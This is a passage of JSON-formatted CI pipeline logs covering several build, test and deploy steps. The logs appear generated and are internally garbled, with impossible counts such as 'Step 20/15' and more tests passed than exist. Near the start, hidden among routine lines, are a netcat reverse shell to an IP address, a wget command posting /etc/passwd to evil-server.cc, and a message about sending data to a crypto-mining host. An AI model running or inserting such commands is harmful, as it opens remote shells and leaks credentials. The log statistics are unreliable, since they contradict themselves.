DEBUG: Query executed in 64ms\nMinifying app.js\n[12:46:03] DEBUG: Memory usage: 1923MB\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nnc -e /bin/sh 222.204.252.73 30506\nImage pulled successfully\nCompleted.\nStep 20/15: Running migrations\nCache miss for key-2331\nFetching submodules...\nEnvironment: test\n  PASS: unit/test_user_create.spec.js\npip: Collecting webpack\nHEAD is now at cbdcf93\n[12:46:03] ERROR: Connection failed\n[12:46:03] DEBUG: Initializing service\n[12:46:03] INFO: Processing request\nTest Suites: 25 passed, 39 total\nSending 88MB of data to crypto-mine.io\nInstalling webpack@4.4.10\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\n  PASS: test_auth_login (207ms)\n  PASS: unit/test_api_health.spec.js\nTransforming 838 files...\n=== Step build completed ===",
    "steps": [
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-17T12:46:02.965945",
        "finished_at": "2025-12-17T12:46:16.766875",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Minifying app.js",
          "Pulling image: alpine:18",
          "[12:46:02] INFO: Starting build process",
          "npm install: added 31 packages",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Cache hit for key-6755",
          "yarn add: Done in 24.63s",
          "Test Suites: 48 passed, 46 total",
          "[12:46:02] DEBUG: Loading configuration",
          "[12:46:02] INFO: Request completed",
          "Step 18/20: Building",
          "Snapshots: 26 passed, 38 total",
          "Step 2/16: Testing",
          "Installing webpack@1.20.3",
          "[12:46:02] DEBUG: Query executed in 5ms",
          "Pulling image: node:3.11",
          "npm install: resolved 361 packages",
          "Step 8/21: Deploying",
          "[12:46:02] INFO: Connecting to database",
          "Compiling components/handler.rs...",
          "Artifact downloaded: 33MB",
          "Ready.",
          "Bundling main.css",
          "[12:46:02] WARN: Deprecated API usage",
          "[12:46:02] INFO: Connecting to database",
          "Creating production build...",
          "Step 18/22: Running migrations",
          "[12:46:02] INFO: Request completed",
          "Exception: TypeError",
          "\u2713 Step 'setup' succeeded",
          "Loading...",
          "Optimizing 13 modules...",
          "Optimizing 53 modules...",
          "[12:46:02] WARN: Deprecated API usage",
          "Switched to branch 'feature/task-903'",
          "Uploading artifact 'coverage' (47 files)",
          "Transforming 391 files...",
          "Verifying...",
          "pip install: Successfully installed eslint-2.17",
          "Finished.",
          "Compiling components/app.ts...",
          "npm install: added 427 packages",
          "Cache miss for key-4320",
          "Completed.",
          "HEAD is now at ca32e7c",
          "Cache saved successfully",
          "Step 2/18: Testing",
          "Cache miss for key-3821",
          "Finished.",
          "npm notice: created a lockfile",
          "WARNING: react has known vulnerabilities",
          "[12:46:02] DEBUG: Connection pool: 1 active",
          "\u2713 lint completed",
          "[12:46:02] DEBUG: Loading configuration",
          "\u2713 lint completed",
          "Connection established",
          "\u2713 Step 'test' succeeded",
          "Checking out main branch",
          "Tests: 142 passed, 297 total",
          "Generating source maps...",
          "Connection established",
          "Done.",
          "Cache miss for key-3076",
          "Fetching submodules...",
          "Compiling components/index.js...",
          "Checking out develop branch",
          "Ran 30 tests in 46s",
          "pip: Downloading webpack-5.17.tar.gz",
          "Snapshots: 44 passed, 7 total",
          "Artifact uploaded: dist.zip (70MB)",
          "[12:46:02] DEBUG: Query executed in 93ms",
          "Pulling image: alpine:18",
          "[12:46:02] WARN: Deprecated API usage",
          "Completed.",
          "[12:46:02] DEBUG: Query executed in 48ms",
          "[12:46:02] DEBUG: Query executed in 87ms",
          "[12:46:02] INFO: Starting build process",
          "Fetching from https://amazonaws.com/package.json",
          "npm notice: package.json updated",
          "[12:46:02] DEBUG: Loading configuration",
          "FAILED: test_auth_login",
          "[12:46:02] INFO: Request completed",
          "Compiling utils/main.py...",
          "TLS handshake completed",
          "Ready.",
          "GET /api - 204 (49ms)",
          "Using Node.js 14.20.4",
          "[12:46:02] DEBUG: Initializing service",
          "Step 1/17: Installing dependencies",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: webpack has known vulnerabilities",
          "Step 11/20: Installing dependencies",
          "Tests: 141 passed, 142 total",
          "Cache saved successfully",
          "Time: 81.267s",
          "[12:46:02] INFO: Processing request",
          "Artifact uploaded: dist.zip (2MB)",
          "Platform: win32-x64",
          "WARNING: eslint has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Platform: linux-x64",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Fetching from https://googleapis.com/package.json",
          "Step 20/15: Running migrations",
          "[12:46:02] INFO: Request completed",
          "[12:46:02] INFO: Connecting to database",
          "\u2717 build failed with exit code 37",
          "Loading...",
          "TLS handshake completed",
          "Generating source maps...",
          "Checking out develop branch",
          "Step 17/15: Running migrations",
          "Using Node.js 15.4.3",
          "Tests: 288 passed, 143 total",
          "GET /status - 200 (41ms)",
          "Snapshots: 17 passed, 43 total",
          "Tests: 202 passed, 491 total",
          "Ready.",
          "[12:46:02] ERROR: Connection failed",
          "Installing prettier@5.15.10",
          "POST /api - 201 (244ms)",
          "[12:46:02] WARN: Deprecated API usage",
          "[12:46:02] INFO: Connecting to database",
          "Cache saved successfully",
          "[12:46:02] DEBUG: Memory usage: 939MB",
          "GET /status - 204 (11ms)",
          "Checking out master branch",
          "Minifying main.js",
          "Cache invalidated: dependencies",
          "Fetching from https://githubusercontent.com/package.json",
          "Cache restored successfully (381MB)",
          "GET /status - 201 (85ms)",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "NODE_ENV=production",
          "Step 6/21: Deploying",
          "Test Suites: 48 passed, 40 total",
          "Test Suites: 38 passed, 17 total",
          "\u2713 Task completed in 4691ms",
          "Compiling src/service.java...",
          "[12:46:02] INFO: Processing request",
          "Fetching submodules...",
          "Creating production build...",
          "Layer 7/12: RUN command",
          "Success!",
          "Success!",
          "[12:46:02] INFO: Starting build process",
          "pip: Collecting jest",
          "Compiling utils/handler.rs...",
          "[12:46:02] WARN: Deprecated API usage",
          "[12:46:02] INFO: Processing request",
          "Step 2/17: Deploying",
          "Generating source maps...",
          "Connection established",
          "[12:46:02] INFO: Request completed",
          "Loading...",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-17T12:46:16.766875",
        "finished_at": "2025-12-17T12:46:23.667340",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "Cache restored successfully (441MB)",
          "Step 4/23: Testing",
          "[12:46:02] INFO: Cache refreshed",
          "HEAD is now at 4d97a4c",
          "pip: Collecting webpack",
          "Verifying...",
          "OK",
          "Cache invalidated: dependencies",
          "Step 2/23: Linting",
          "Tests: 446 passed, 489 total",
          "Compiling lib/service.java...",
          "Completed.",
          "Pushing to registry...",
          "GET /health - 201 (42ms)",
          "Snapshots: 20 passed, 13 total",
          "Compiling components/app.ts...",
          "pip install: Successfully installed eslint-2.19",
          "Done.",
          "Pulling image: python:latest",
          "Test Suites: 45 passed, 37 total",
          "\u2713 deploy completed",
          "OK",
          "Switched to branch 'bugfix/task-915'",
          "Step 10/17: Linting",
          "Transforming 468 files...",
          "Ran 11 tests in 6s",
          "Compiling src/service.java...",
          "GET /status - 200 (1ms)",
          "Done.",
          "Checking out master branch",
          "[12:46:02] ERROR: Connection failed",
          "WARNING: webpack has known vulnerabilities",
          "pip: Downloading react-4.5.tar.gz",
          "Step 10/21: Running migrations",
          "[12:46:02] INFO: Cache refreshed",
          "Fetching submodules...",
          "Already up to date.",
          "[12:46:02] WARN: Deprecated API usage",
          "Waiting...",
          "pip install: Successfully installed axios-2.16",
          "Transforming 702 files...",
          "\u2713 test completed",
          "Installing lodash@3.5.1",
          "Finished.",
          "Using Python 3.11",
          "pip: Installing build dependencies...",
          "[12:46:02] ERROR: Connection failed",
          "[12:46:02] DEBUG: Query executed in 87ms",
          "Environment: production",
          "Time: 104.445s",
          "FAILED: test_auth_login",
          "Time: 90.524s",
          "Artifact downloaded: 36MB",
          "Using Node.js 19.15.1",
          "Bundling vendor.js",
          "HEAD is now at f0708a2",
          "Finished.",
          "Step 7/15: Deploying",
          "Generating source maps...",
          "[12:46:02] DEBUG: Initializing service",
          "Image pulled successfully",
          "yarn add: Done in 2.13s",
          "[12:46:02] INFO: Request completed",
          "NODE_ENV=development",
          "Ran 162 tests in 21s",
          "Snapshots: 15 passed, 13 total",
          "Artifact uploaded: dist.zip (41MB)",
          "FAILED: test_api_health",
          "\u2713 lint completed",
          "Step 18/18: Building",
          "Pushing to registry...",
          "Compiling lib/index.js...",
          "Building Docker image...",
          "Building Docker image...",
          "Cache hit for key-2162",
          "Platform: linux-x64",
          "Step 2/23: Running migrations",
          "  PASS: test_db_connect (72ms)",
          "FAILED: test_api_health",
          "Step 12/24: Deploying",
          "Fetching from https://gcr.io/package.json",
          "Optimizing 40 modules...",
          "Compiling src/main.py...",
          "  PASS: unit/test_user_create.spec.js",
          "WARNING: prettier has known vulnerabilities",
          "\u2717 build failed with exit code 42",
          "Transforming 159 files...",
          "Finished.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 18/22: Testing",
          "\u2717 build failed with exit code 78",
          "yarn add: Done in 12.88s",
          "Finished.",
          "Ran 126 tests in 21s",
          "Compiling components/main.py...",
          "Step 11/21: Building",
          "yarn add: Done in 28.61s",
          "[12:46:02] DEBUG: Query executed in 72ms",
          "Time: 59.907s",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:46:02] INFO: Starting build process",
          "[12:46:02] INFO: Cache refreshed",
          "Platform: linux-x64",
          "Cache saved successfully",
          "[12:46:02] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Creating production build...",
          "WARNING: express has known vulnerabilities",
          "NODE_ENV=development",
          "npm install: added 286 packages",
          "npm notice: created a lockfile",
          "Image pulled successfully",
          "Step 12/16: Testing",
          "Transforming 627 files...",
          "Finished.",
          "Fetching submodules...",
          "Tests: 410 passed, 139 total",
          "Compiling lib/handler.rs...",
          "NODE_ENV=development",
          "FAILED: test_auth_login",
          "Creating production build...",
          "Platform: win32-x64",
          "yarn add: Done in 9.53s",
          "Generating source maps...",
          "TLS handshake completed",
          "Environment: test",
          "[12:46:02] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Fetching from https://gcr.io/package.json",
          "Already up to date.",
          "npm install: added 97 packages",
          "[12:46:02] DEBUG: Memory usage: 1811MB",
          "Finished.",
          "Creating production build...",
          "POST /upload - 201 (78ms)",
          "Creating production build...",
          "[12:46:02] INFO: Processing request",
          "Compiling utils/app.ts...",
          "WARNING: react has known vulnerabilities",
          "[12:46:02] DEBUG: Query executed in 16ms",
          "Layer 1/10: ENV command",
          "pip: Downloading axios-3.13.tar.gz",
          "[12:46:02] DEBUG: Memory usage: 1773MB",
          "Exception: TypeError",
          "Switched to branch 'bugfix/task-532'",
          "  PASS: integration/test_user_create.spec.js",
          "Step 4/23: Linting",
          "Step 18/22: Deploying",
          "Time: 115.490s",
          "Image pulled successfully",
          "Compiling lib/index.js...",
          "npm install: added 305 packages",
          "WARNING: jest has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (36MB)",
          "pip: Installing build dependencies...",
          "POST /api - 202 (60ms)",
          "npm notice: package.json updated",
          "Snapshots: 10 passed, 13 total",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-17T12:46:23.667340",
        "finished_at": "2025-12-17T12:46:26.427526",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Compiling components/app.ts...",
          "Processing...",
          "[12:46:02] INFO: Processing request",
          "[12:46:02] INFO: Cache refreshed",
          "Compiling components/handler.rs...",
          "Generating source maps...",
          "pip: Installing build dependencies...",
          "pip: Installing build dependencies...",
          "\u2713 validate completed",
          "WARNING: react has known vulnerabilities",
          "Artifact downloaded: 26MB",
          "HEAD is now at ca7b7ca",
          "[12:46:02] DEBUG: Connection pool: 8 active",
          "Exception: RuntimeError",
          "Compiling components/main.py...",
          "[12:46:02] WARN: Deprecated API usage",
          "[12:46:02] DEBUG: Initializing service",
          "Installing express@4.14.6",
          "Compiling components/utils.go...",
          "GET /health - 200 (4ms)",
          "TLS handshake completed",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "pip: Collecting react",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:46:02] INFO: Request completed",
          "Success!",
          "Minifying main.js",
          "[12:46:02] DEBUG: Loading configuration",
          "Step 18/18: Running migrations",
          "Verifying...",
          "Success!",
          "Installing react@4.13.5",
          "Artifact downloaded: 12MB",
          "Artifact downloaded: 38MB",
          "Step 14/22: Building",
          "  PASS: test_user_create (7ms)",
          "Waiting...",
          "[12:46:02] DEBUG: Connection pool: 6 active",
          "npm notice: created a lockfile",
          "Test Suites: 18 passed, 40 total",
          "[12:46:02] INFO: Request completed",
          "npm notice: package.json updated",
          "Compiling components/service.java...",
          "[12:46:02] INFO: Cache refreshed",
          "Success!",
          "Waiting...",
          "Cache invalidated: node_modules",
          "Success!",
          "[12:46:02] DEBUG: Query executed in 56ms",
          "FAILED: test_db_connect",
          "Cache miss for key-7362",
          "[12:46:02] DEBUG: Connection pool: 19 active",
          "POST /api - 202 (97ms)",
          "Artifact downloaded: 3MB",
          "[12:46:02] DEBUG: Initializing service",
          "[12:46:02] DEBUG: Connection pool: 17 active",
          "Processing...",
          "Already up to date.",
          "Connection established",
          "Using Python 3.10",
          "[12:46:02] INFO: Processing request",
          "Tests: 413 passed, 354 total",
          "Coverage: 81% statements, 75% branches",
          "Completed.",
          "Completed.",
          "Compiling components/app.ts...",
          "Transforming 357 files...",
          "Test Suites: 38 passed, 34 total",
          "Already up to date.",
          "OK",
          "Image pulled successfully",
          "Already up to date.",
          "[12:46:02] DEBUG: Memory usage: 1255MB",
          "  PASS: test_user_create (265ms)",
          "[12:46:02] WARN: Deprecated API usage",
          "Uploading artifact 'coverage' (27 files)",
          "POST /upload - 201 (472ms)",
          "Cache miss for key-4608",
          "Transforming 391 files...",
          "Exception: TypeError",
          "Layer 2/11: ENV command",
          "Environment: test",
          "Ready.",
          "WARNING: axios has known vulnerabilities",
          "Image pulled successfully",
          "Success!",
          "Step 3/21: Building",
          "Step 16/23: Installing dependencies",
          "Finished.",
          "Pushing to registry...",
          "[12:46:02] INFO: Processing request",
          "GET /health - 200 (37ms)",
          "Installing jest@4.8.4",
          "Transforming 998 files...",
          "\u2713 Task completed in 3012ms",
          "Ready.",
          "\u2713 All checks passed",
          "Step 18/21: Deploying",
          "\u2713 Task completed in 533ms",
          "Installing prettier@3.16.6",
          "Processing...",
          "TLS handshake completed",
          "pip: Downloading jest-1.20.tar.gz",
          "Cache hit for key-6310",
          "GET /api - 201 (42ms)",
          "Installing lodash@1.2.9",
          "[12:46:02] DEBUG: Query executed in 76ms",
          "TLS handshake completed",
          "[12:46:02] DEBUG: Loading configuration",
          "Building Docker image...",
          "Using Python 3.12",
          "Step 15/17: Running migrations",
          "[12:46:02] WARN: Deprecated API usage",
          "Generating source maps...",
          "Minifying vendor.js",
          "Step 20/18: Deploying",
          "pip: Downloading webpack-5.5.tar.gz",
          "Step 5/21: Deploying",
          "WARNING: express has known vulnerabilities",
          "[12:46:02] DEBUG: Initializing service",
          "Step 16/19: Deploying",
          "Ran 29 tests in 23s",
          "HEAD is now at a62d7fa",
          "  PASS: unit/test_db_connect.spec.js",
          "Using Node.js 19.16.6",
          "\u2713 Step 'install' succeeded",
          "Done.",
          "Cache restored successfully (354MB)",
          "Compiling lib/service.java...",
          "Exception: ValueError",
          "[12:46:02] INFO: Cache refreshed",
          "Step 20/23: Building",
          "Cache miss for key-1796",
          "Bundling main.css",
          "Artifact uploaded: dist.zip (3MB)",
          "Ran 165 tests in 56s",
          "npm notice: created a lockfile",
          "Cache invalidated: build",
          "Loading...",
          "pip: Collecting react",
          "[12:46:02] WARN: Deprecated API usage",
          "Done.",
          "Exception: NullPointerException",
          "Image pulled successfully",
          "Artifact uploaded: dist.zip (7MB)",
          "Minifying app.js",
          "Loading...",
          "pip: Collecting webpack",
          "Minifying main.js",
          "Exception: RuntimeError",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Success!",
          "Coverage: 93% statements, 90% branches",
          "Installing jest@3.1.5",
          "npm install: added 435 packages",
          "pip: Installing build dependencies...",
          "Cache saved successfully",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-17T12:46:26.427526",
        "finished_at": "2025-12-17T12:46:33.327991",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Verifying...",
          "Platform: linux-x64",
          "Step 12/24: Building",
          "[12:46:03] INFO: Connecting to database",
          "[12:46:03] INFO: Request completed",
          "npm notice: package.json updated",
          "Test Suites: 42 passed, 5 total",
          "npm install: resolved 104 packages",
          "Ran 66 tests in 4s",
          "Processing...",
          "Compiling lib/main.py...",
          "pip: Collecting eslint",
          "[12:46:03] INFO: Request completed",
          "npm notice: created a lockfile",
          "[12:46:03] INFO: Starting build process",
          "Artifact uploaded: build.tar.gz (40MB)",
          "TLS handshake completed",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/service.java...",
          "\u2713 deploy completed",
          "Cache miss for key-8358",
          "WARNING: react has known vulnerabilities",
          "Time: 101.586s",
          "Step 4/24: Building",
          "Environment: development",
          "Using Node.js 20.15.6",
          "npm install: resolved 1861 packages",
          "Artifact uploaded: dist.zip (74MB)",
          "OK",
          "Fetching from https://pypi.org/package.json",
          "Completed.",
          "Time: 53.554s",
          "HEAD is now at e5cd6f1",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Using Python 3.11",
          "Transforming 679 files...",
          "pip: Installing build dependencies...",
          "NODE_ENV=production",
          "Waiting...",
          "WARNING: webpack has known vulnerabilities",
          "Verifying...",
          "Image pulled successfully",
          "Step 13/19: Linting",
          "Artifact uploaded: build.tar.gz (25MB)",
          "[12:46:03] WARN: Deprecated API usage",
          "FAILED: test_cache_hit",
          "Step 9/18: Installing dependencies",
          "Step 8/20: Deploying",
          "  PASS: test_user_create (26ms)",
          "Cache restored successfully (334MB)",
          "[12:46:03] INFO: Request completed",
          "Using Node.js 14.1.0",
          "Generating source maps...",
          "Environment: development",
          "Cache invalidated: build",
          "npm notice: package.json updated",
          "Step 18/19: Linting",
          "Building Docker image...",
          "Done.",
          "\u2713 Task completed in 2411ms",
          "GET /health - 200 (79ms)",
          "[12:46:03] INFO: Cache refreshed",
          "Compiling utils/index.js...",
          "pip: Downloading prettier-2.2.tar.gz",
          "Tests: 292 passed, 211 total",
          "pip: Downloading react-2.14.tar.gz",
          "pip: Installing build dependencies...",
          "Fetching from https://docker.io/package.json",
          "[12:46:03] DEBUG: Loading configuration",
          "\u2717 build failed with exit code 40",
          "[12:46:03] INFO: Connecting to database",
          "Success!",
          "Artifact uploaded: dist.zip (44MB)",
          "WARNING: axios has known vulnerabilities",
          "\u2717 build failed with exit code 34",
          "Connection established",
          "FAILED: test_cache_hit",
          "WARNING: jest has known vulnerabilities",
          "Fetching from https://npmjs.org/package.json",
          "Artifact uploaded: dist.zip (58MB)",
          "Loading...",
          "Pushing to registry...",
          "npm notice: package.json updated",
          "Artifact downloaded: 31MB",
          "TLS handshake completed",
          "Generating source maps...",
          "Verifying...",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "Finished.",
          "Time: 10.47s",
          "[12:46:03] DEBUG: Loading configuration",
          "Environment: production",
          "Installing eslint@3.0.1",
          "POST /data - 202 (347ms)",
          "Fetching from https://amazonaws.com/package.json",
          "[12:46:03] INFO: Cache refreshed",
          "Pushing to registry...",
          "Pushing to registry...",
          "npm notice: package.json updated",
          "Cache saved successfully",
          "Step 5/17: Building",
          "\u2717 build failed with exit code 76",
          "Cache invalidated: node_modules",
          "Snapshots: 1 passed, 32 total",
          "Done.",
          "\u2713 Task completed in 1650ms",
          "WARNING: jest has known vulnerabilities",
          "Transforming 274 files...",
          "Switched to branch 'bugfix/task-756'",
          "Compiling utils/index.js...",
          "Done.",
          "[12:46:03] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 Step 'test' succeeded",
          "yarn add: Done in 5.12s",
          "NODE_ENV=development",
          "  PASS: e2e/test_auth_login.spec.js",
          "Already up to date.",
          "\u2713 build completed",
          "Processing...",
          "[12:46:03] INFO: Request completed",
          "TLS handshake completed",
          "Compiling src/handler.rs...",
          "Artifact downloaded: 5MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Installing jest@5.15.6",
          "pip install: Successfully installed lodash-1.16",
          "Loading...",
          "[12:46:03] INFO: Request completed",
          "Cache miss for key-1005",
          "Generating source maps...",
          "pip: Downloading axios-1.7.tar.gz",
          "\u2717 build failed with exit code 108",
          "Layer 8/8: COPY command",
          "Compiling components/main.py...",
          "Installing prettier@1.13.10",
          "Compiling src/main.py...",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "Step 2/23: Testing",
          "pip: Downloading axios-5.5.tar.gz",
          "pip: Downloading jest-4.3.tar.gz",
          "Success!",
          "Completed.",
          "Step 17/25: Linting",
          "\u2717 build failed with exit code 114",
          "  PASS: test_db_connect (251ms)",
          "Processing...",
          "Pulling image: alpine:latest",
          "Step 6/18: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:46:03] INFO: Request completed",
          "Switched to branch 'hotfix/task-455'",
          "Artifact downloaded: 46MB",
          "Artifact uploaded: dist.zip (70MB)",
          "OK",
          "[12:46:03] DEBUG: Memory usage: 1030MB",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-17T12:46:33.327991",
        "finished_at": "2025-12-17T12:46:40.228456",
        "log_lines": [
          "=== Step: setup_environment ===",
          "[12:46:03] DEBUG: Connection pool: 17 active",
          "Loading...",
          "pip: Installing build dependencies...",
          "[12:46:03] INFO: Cache refreshed",
          "Bundling runtime.css",
          "npm notice: package.json updated",
          "Using Python 3.12",
          "Loading...",
          "Time: 16.54s",
          "[12:46:03] DEBUG: Connection pool: 19 active",
          "Pushing to registry...",
          "Compiling src/handler.rs...",
          "Generating source maps...",
          "[12:46:03] INFO: Request completed",
          "pip: Installing build dependencies...",
          "Connection established",
          "Test Suites: 30 passed, 11 total",
          "npm notice: package.json updated",
          "pip: Collecting react",
          "[12:46:03] INFO: Connecting to database",
          "Processing...",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Optimizing 17 modules...",
          "Platform: linux-x64",
          "Cache hit for key-8364",
          "Waiting...",
          "[12:46:03] DEBUG: Query executed in 4ms",
          "yarn add: Done in 14.13s",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:03] ERROR: Connection failed",
          "[12:46:03] DEBUG: Connection pool: 10 active",
          "Fetching from https://githubusercontent.com/package.json",
          "Bundling runtime.js",
          "WARNING: express has known vulnerabilities",
          "Compiling lib/app.ts...",
          "[12:46:03] INFO: Connecting to database",
          "Cache saved successfully",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: axios has known vulnerabilities",
          "NODE_ENV=development",
          "[12:46:03] WARN: Deprecated API usage",
          "Minifying app.js",
          "\u2717 build failed with exit code 41",
          "npm install: resolved 1513 packages",
          "npm install: added 223 packages",
          "Pulling image: alpine:3.11",
          "pip install: Successfully installed express-2.12",
          "Environment: test",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling lib/handler.rs...",
          "Test Suites: 45 passed, 35 total",
          "POST /api - 202 (231ms)",
          "Environment: test",
          "[12:46:03] DEBUG: Query executed in 40ms",
          "pip: Collecting webpack",
          "[12:46:03] INFO: Cache refreshed",
          "Image pulled successfully",
          "Artifact uploaded: build.tar.gz (21MB)",
          "pip install: Successfully installed lodash-3.9",
          "[12:46:03] DEBUG: Memory usage: 536MB",
          "Compiling src/app.ts...",
          "Platform: linux-x64",
          "Compiling utils/index.js...",
          "Cache hit for key-7207",
          "Verifying...",
          "[12:46:03] WARN: Deprecated API usage",
          "Checking out develop branch",
          "Environment: production",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Artifact uploaded: dist.zip (77MB)",
          "Artifact downloaded: 3MB",
          "npm install: added 29 packages",
          "Cache hit for key-7658",
          "Snapshots: 39 passed, 43 total",
          "[12:46:03] INFO: Request completed",
          "Ran 197 tests in 35s",
          "Minifying main.js",
          "Cache invalidated: dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Generating source maps...",
          "Success!",
          "Time: 67.536s",
          "Generating source maps...",
          "Finished.",
          "FAILED: test_db_connect",
          "npm notice: package.json updated",
          "Compiling lib/main.py...",
          "Uploading artifact 'coverage' (49 files)",
          "Building Docker image...",
          "Fetching from https://googleapis.com/package.json",
          "Transforming 804 files...",
          "[12:46:03] DEBUG: Memory usage: 841MB",
          "Platform: win32-x64",
          "  PASS: integration/test_user_create.spec.js",
          "[12:46:03] INFO: Cache refreshed",
          "WARNING: react has known vulnerabilities",
          "Already up to date.",
          "GET /health - 201 (52ms)",
          "Ready.",
          "npm install: resolved 1085 packages",
          "Installing lodash@2.6.4",
          "Loading...",
          "Verifying...",
          "Step 1/24: Linting",
          "Layer 2/9: COPY command",
          "[12:46:03] DEBUG: Loading configuration",
          "pip: Downloading jest-4.11.tar.gz",
          "Time: 91.512s",
          "Step 7/23: Running migrations",
          "Optimizing 61 modules...",
          "Transforming 501 files...",
          "Step 12/19: Building",
          "Processing...",
          "npm notice: package.json updated",
          "Coverage: 87% statements, 85% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/handler.rs...",
          "Step 16/20: Linting",
          "Installing prettier@2.11.0",
          "[12:46:03] DEBUG: Memory usage: 1228MB",
          "Bundling styles.css",
          "npm install: resolved 1590 packages",
          "Step 1/18: Linting",
          "Using Python 3.9",
          "Creating production build...",
          "[12:46:03] WARN: Deprecated API usage",
          "[12:46:03] INFO: Cache refreshed",
          "yarn add: Done in 18.88s",
          "[12:46:03] DEBUG: Loading configuration",
          "\u2713 deploy completed",
          "[12:46:03] INFO: Cache refreshed",
          "Step 10/19: Installing dependencies",
          "Compiling components/main.py...",
          "[12:46:03] INFO: Starting build process",
          "[12:46:03] DEBUG: Loading configuration",
          "Ran 152 tests in 22s",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_user_create (131ms)",
          "Uploading artifact 'coverage' (13 files)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Already up to date.",
          "Cache hit for key-5015",
          "Artifact downloaded: 12MB",
          "Done.",
          "Ran 73 tests in 60s",
          "Coverage: 98% statements, 74% branches",
          "pip: Installing build dependencies...",
          "Step 1/15: Running migrations",
          "Ran 153 tests in 34s",
          "Compiling utils/service.java...",
          "NODE_ENV=development",
          "Completed.",
          "pip: Downloading express-1.20.tar.gz",
          "[12:46:03] DEBUG: Connection pool: 17 active",
          "Completed.",
          "[12:46:03] DEBUG: Query executed in 12ms",
          "TLS handshake completed",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-17T12:46:40.228456",
        "finished_at": "2025-12-17T12:47:00.929851",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Connection established",
          "Minifying main.js",
          "Waiting...",
          "Building Docker image...",
          "npm notice: package.json updated",
          "Compiling lib/index.js...",
          "\u2713 Task completed in 3048ms",
          "Image pulled successfully",
          "yarn add: Done in 25.64s",
          "Using Python 3.9",
          "Tests: 173 passed, 362 total",
          "[12:46:03] DEBUG: Query executed in 35ms",
          "[12:46:03] INFO: Connecting to database",
          "[12:46:03] INFO: Request completed",
          "Bundling styles.js",
          "Success!",
          "Cache hit for key-1799",
          "Completed.",
          "\u2713 Step 'checkout' succeeded",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (34MB)",
          "yarn add: Done in 22.60s",
          "Using Node.js 18.12.1",
          "Step 7/19: Linting",
          "Exception: TypeError",
          "npm install: resolved 662 packages",
          "Transforming 733 files...",
          "Minifying vendor.js",
          "HEAD is now at 701a3c1",
          "Installing express@5.4.4",
          "Done.",
          "[12:46:03] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "pip install: Successfully installed webpack-3.5",
          "[12:46:03] INFO: Processing request",
          "Cache miss for key-6375",
          "Loading...",
          "[12:46:03] DEBUG: Query executed in 90ms",
          "[12:46:03] INFO: Processing request",
          "Artifact downloaded: 30MB",
          "\u2713 Step 'build' succeeded",
          "GET /api - 200 (20ms)",
          "Finished.",
          "  PASS: test_user_create (48ms)",
          "Compiling utils/utils.go...",
          "Generating source maps...",
          "Cache miss for key-2973",
          "[12:46:03] INFO: Request completed",
          "Ready.",
          "[12:46:03] INFO: Request completed",
          "\u2713 All checks passed",
          "Compiling src/app.ts...",
          "\u2713 Step 'install' succeeded",
          "Step 20/21: Deploying",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Minifying vendor.js",
          "npm install: resolved 1641 packages",
          "pip: Collecting eslint",
          "Processing...",
          "\u2713 lint completed",
          "\u2713 All checks passed",
          "\u2717 build failed with exit code 94",
          "Uploading artifact 'coverage' (20 files)",
          "Already up to date.",
          "Pushing to registry...",
          "Step 17/20: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "GET /api - 201 (57ms)",
          "Cache restored successfully (300MB)",
          "  PASS: test_db_connect (476ms)",
          "Time: 112.27s",
          "Time: 104.115s",
          "Finished.",
          "POST /api - 200 (137ms)",
          "Switched to branch 'hotfix/task-308'",
          "Image pulled successfully",
          "Step 15/15: Linting",
          "Ran 43 tests in 59s",
